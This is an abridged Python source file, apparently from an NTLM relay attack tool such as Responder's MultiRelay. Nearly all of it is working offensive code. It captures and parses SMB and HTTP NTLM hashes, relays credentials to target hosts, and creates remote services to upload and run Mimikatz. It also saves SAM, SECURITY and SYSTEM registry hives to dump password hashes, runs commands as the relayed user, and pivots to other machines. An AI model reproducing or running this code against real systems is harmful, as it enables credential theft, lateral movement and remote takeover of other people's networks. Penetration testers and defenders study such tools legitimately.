...
sys.path.append(
    os.path.abspath(os.path.join(os.path.dirname(__file__), "impacket-dev/"))
)
...
SaveSam_Path = (
    os.path.abspath(os.path.join(os.path.dirname(__file__))) + "/relay-dumps/"
)
...
def ReadData(Outfile, Client, User, Domain, Target, cmd):
    try:
        with open(Logs_Path + "logs/" + Outfile, "rb") as filestr:
            ...
            if re.search(
                codecs.encode(NetworkSendBufferPython2or3(Login), "hex"),
                codecs.encode(filestr.read(), "hex"),
            ):
                print(
                    "[+] User %s\\%s previous login attempt returned logon_failure. Not forwarding anymore to prevent account lockout\n"
                    % (Domain, User)
                )
                return True
...
def ParseHTTPHash(data, key, client, UserToRelay, Host, Pivoting):
    ...
    LMHash = (
        codecs.encode(data[LMhashOffset : LMhashOffset + LMhashLen], "hex")
        .decode("latin-1")
        .upper()
    )
    ...
    NTHash = (
        codecs.encode(data[NthashOffset : NthashOffset + NthashLen], "hex")
        .decode("latin-1")
        .upper()
    )
    ...
    if NthashLen == 24:
        ...
        HostName = data[HostNameOffset : HostNameOffset + HostNameLen].replace(
            "\x00", ""
        )
        WriteHash = "%s::%s:%s:%s:%s" % (
            User,
...
def ParseSMBHash(
    data, client, challenge, UserToRelay, Host, Pivoting
    ...
    LMHash = (
        codecs.encode(SSPIString[LMhashOffset : LMhashOffset + LMhashLen], "hex")
        .decode("latin-1")
        .upper()
    )
    ...
    if NthashLen == 24:
        SMBHash = (
            codecs.encode(SSPIString[NthashOffset : NthashOffset + NthashLen], "hex")
            .decode("latin-1")
            .upper()
        )
        ...
        WriteData(
            Logs_Path + "logs/SMB-Relay-SMB-" + client + ".txt", WriteHash, Username
        )
        if client == Host:
            if Pivoting[0] == "1":
                pass
        ...
        if Username in UserToRelay or "ALL" in UserToRelay:
            ...
            print(
                "[+] Username: %s is whitelisted, forwarding credentials." % (Username)
            )
            if ReadData(
                "SMBRelay-Session.txt", client, Username, Domain, Host, cmd=None
            ):
                ##Domain\User has already auth on this target, but it failed. Ditch the connection to prevent account lockouts.
                return None, None
            else:
            ...
            print(
                "[+] Username: %s not in target list, dropping connection." % (Username)
            )
            return None, None
...
def ExtractHTTPChallenge(data, Pivoting):
    ...
    if Pivoting[0] == "1":
        ...
        print(
            "[+] Setting up HTTP relay with SMB challenge:",
            codecs.encode(Challenge, "hex").decode("latin-1"),
        )
        return Challenge
...
def GetSessionResponseFlags(data):
    if data[41:43] == b"\x01\x00":
        print(
            "[+] Server returned session positive, but as guest. Psexec should fail even if authentication was successful.."
        )
...
def SMBKeepAlive(s, data):
    head = SMBHeader(
        ...
        flag2="\x07\xc8",
        mid="\x04\x00",
        pid=data[30:32].decode("latin-1"),
        uid=data[32:34].decode("latin-1"),
        tid=data[28:30].decode("latin-1"),
    )
    t = SMBEcho()
...
def SMBDCERPCReadOutput(DataOffset, length, f, data, s):
    ...
    t = SMBDCERPCReadRequestAndX(
        FID=f.decode("latin-1"), MaxCountLow=length, MinCount=length, Offset=DataOffset
    )
    packet1 = str(head) + str(t)
    buffer1 = longueur(packet1) + packet1
    s.send(NetworkSendBufferPython2or3(buffer1))
...
def BindCall(UID, Version, File, data, s):
    ...
    if data[8:10] == b"\xa2\x22":
        print(
            "[+] NT_CREATE denied. SMB Signing mandatory or this user has no privileges on this workstation.\n"
        )
...
def MimiKatzRPC(Command, f, host, data, s):
    ...
    if data[8:10] == b"\x2f\x00":
        ...
        t = SMBReadData(
            FID=f.decode("latin-1"),
            MaxCountLow=StructWithLenPython2or3("<h", 1024),
            MinCount=StructWithLenPython2or3("<h", 1024),
            Offset="\x00\x00\x00\x00",
        )
        t.calculate()
        packet0 = str(head) + str(t)
    ...
    if data[8:10] == b"\x2e\x05":
        ...
        while True:
            ...
            if (
                data[64:66] == b"\x05\x00" and data[67:68] == b"\x02"
            ):  ##Last DCE/RPC Frag
                ...
                if LastFragLen < 1024:
                    ...
                    data, s, out = SMBDCERPCReadOutput(
                        StructWithLenPython2or3("<i", dataoffset),
                        StructWithLenPython2or3("<h", 4096),
                        f,
                        data,
                        s,
                    )
            ...
            if (
                data[64:66] == b"\x05\x00" and data[67:68] == b"\x03"
            ):  ##First and Last DCE/RPCFrag
                data, s, out = SMBDCERPCReadOutput(
                    StructWithLenPython2or3("<i", dataoffset),
                    StructWithLenPython2or3("<h", 4096),
                    f,
                ...
                data, s, out = SMBDCERPCReadOutput(
                    StructWithLenPython2or3("<i", dataoffset),
                    StructWithLenPython2or3("<h", buffsize),
                    f,
                    data,
                    s,
                )
...
def CreateMimikatzService(Command, ServiceNameChars, ServiceIDChars, f, host, data, s):
    ...
    if data[8:10] == b"\x2e\x00":
        ...
        w = SMBDCESVCCTLOpenManagerW(
            MachineNameRefID="\x00\x00\x02\x00", MachineName=host
        )
        w.calculate()
    ...
    if data[8:10] == b"\x25\x00":
        ...
        w = SMBDCESVCCTLOpenService(
            ContextHandle=ContextHandler, ServiceName=ServiceNameChars
        )
        w.calculate()
...
def StopAndDeleteService(Command, ServiceNameChars, ServiceIDChars, f, host, data, s):
    ...
    if data[8:10] == b"\x25\x00":
        ...
        w = SMBDCESVCCTLOpenService(
            ContextHandle=ContextHandlerService, ServiceName=ServiceNameChars
        )
        w.calculate()
        x = SMBDCEPacketData(Opnum="\x10\x00", Data=w)
        x.calculate()
    ...
    if data[8:10] == b"\x25\x00":
        ...
        w = SMBDCESVCCTLControlService(
            ContextHandle=ContextHandlerService, ControlOperation="\x01\x00\x00\x00"
        )
...
def StartWinregService(f, host, data, s):
    ...
    if data[8:10] == b"\x25\x00":
        ...
        w = SMBDCESVCCTLOpenService(
            ContextHandle=ContextHandler, ServiceName="RemoteRegistry"
        )
        w.calculate()
        x = SMBDCEPacketData(Opnum="\x10\x00", Data=w)
        x.calculate()
...
def SMBOpenFile(Filename, Share, Host, Access, data, s):
    ...
    if data[8:10] == b"\x75\x00":
        ...
        t = OpenAndX(
            File=Filename, OpenFunc="\x01\x00", Flags="\x07\x00", DesiredAccess=Access
        )
        t.calculate()
        packet1 = str(head) + str(t)
        buffer1 = longueur(packet1) + packet1
...
def SMBOpenFileForWriting(
    Filename, FileSize, FileContent, Share, Host, Access, data, s
):
    if isinstance(data, str):
        data = data.encode("latin-1")
    ##Start with a Tree connect on C$
    ...
    if data[8:10] == b"\xa2\x35":
        print(
            "[+] Name collision, this file already exist in windows/temp/. Try: delete /windows/Temp/"
            + Filename
        )
        f = "A"  # Don't throw an exception at the calling function because there's not enough value to unpack.
        # We'll recover that connection..
        ...
        if data[8:10] == b"\x2e\x00" and struct.unpack("<H", data[61:63])[0] == 65520:
            ...
            for i in range(count_number):
                ...
                data, s, out = ReadOutput(
                    StructWithLenPython2or3("<i", dataoffset), f, data, s
                )
    ...
    if data[8:10] == b"\xa2\x00" and int(FileSize) >= 30000:
        ...
        for i in range(count_number):
            ...
            if len(Chunk) == 0:
                ...
                data, s = WriteOutput(
                    StructWithLenPython2or3("<I", dataoffset), Chunk, data, f, s
                )
...
def DumpHashes(data, s, Host):
    ...
    try:
        ...
        Results = Hashes.dump(
            sam=SaveSam_Path + "./" + Host + "-SAM.tmp",
            security=SaveSam_Path + "./" + Host + "-SECURITY.tmp",
            system=SaveSam_Path + "./" + Host + "-SYSTEM.tmp",
            outfile=SaveSam_Path + "./" + Host,
        )
...
def SaveAKey(data, s, Host, Key):
    ...
    try:
        ...
        if data[8:10] == b"\x25\x00":
            if data[len(data) - 4 :] == b"\x05\x00\x00\x00":
                print(
                    "[+] Failed to open Winreg HKLM, is that user a local admin on this host?\n"
                )
                return ModifySMBRetCode(data)
        ...
        print(
            "[+] The "
            + Key
            + " key and its subkeys were saved in: ./relay-dumps/"
            + Host
            + "-"
            + Key
            + ".tmp"
...
def RunAsCmd(data, s, clientIP, Username, Domain, Command, Logs, Host, FileName):
    ...
    try:
        ...
        LogFile = "\\Windows\\Temp\\" + RandomFName + ".txt"
        Command = (
            "%windir%\\Temp\\" + FileName + ' "' + Command + '" "' + WinTmpPath + '"'
        )
        ServiceNameChars = GenerateServiceName()
        ServiceIDChars = GenerateServiceID()
...
def InstallMimiKatz(data, s, clientIP, Username, Domain, Command, Logs, Host, FileName):
    ...
    try:
        ...
        Command = (
            "c:\\Windows\\Temp\\"
            + FileName
            + ' "rpc::server /protseq:ncacn_np /endpoint:\pipe\\'
            + NamedPipe
            + " /guid:{"
            + DisplayGUID
            + '} /noreg" service::me exit'
        )
...
def RunMimiCmd(data, s, clientIP, Username, Domain, Command, Logs, Host, FileName):
    try:
        ...
        # Don't loose this connection because something went wrong, it's a good one. Commands might fail, while hashdump works.
        print(
            "[+] Something went wrong while calling mimikatz. Maybe it's a 32bits system? Try mimi32."
        )
        return ModifySMBRetCode(data)
...
def PivotToOtherHost(
    data, s, clientIP, Username, Domain, Logs, Host, RunAsPath, RunAsFileName
):
...
##########VerifyPivot#############
def VerifyPivot(
    data, s, clientIP, Username, Domain, Pivot, Logs, Host, RunAsPath, RunAsFileName
):
